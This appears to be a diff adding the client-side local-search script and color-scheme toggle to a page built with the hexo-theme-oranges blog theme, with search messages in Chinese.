+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
